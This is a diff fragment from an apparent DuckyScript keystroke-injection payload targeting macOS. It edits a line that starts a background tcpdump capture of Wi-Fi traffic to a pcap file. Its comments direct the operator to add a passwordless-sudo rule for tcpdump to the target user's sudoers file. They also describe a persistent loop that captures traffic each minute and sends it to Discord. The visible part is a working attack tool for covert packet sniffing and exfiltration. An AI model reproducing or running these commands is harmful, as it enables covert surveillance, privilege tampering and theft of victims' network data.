@@ -50,7 +50,7 @@ ENTER
 DELAY 1000
 REM Execute a passwordless sudo tcpsump by modifying the sudoers file then dump the packets of the host to a file.  this is the the addition that must be added to the sudoers file <USERNAME> ALL=(ALL) NOPASSWD: /usr/bin/tcpdump    replace <USERNAME> with the username of the targeted user.
 REM we use the '-w' in place of the '>' operator here because '>' gives sends a pcap that wireshark cannot read , '-w' resolves the issue.
-STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s; sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x0080' -w infinitydump.pcap &
+STRING sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x0080' -w infinitydump.pcap &
 ENTER
 DELAY 60000
 REM the provided script sequence, the action is intended to work continuously with persistence.  After the script is executed, it captures Wi-Fi traffic for 1 min, sends the captured data to Discord, and then repeats the entire process.  
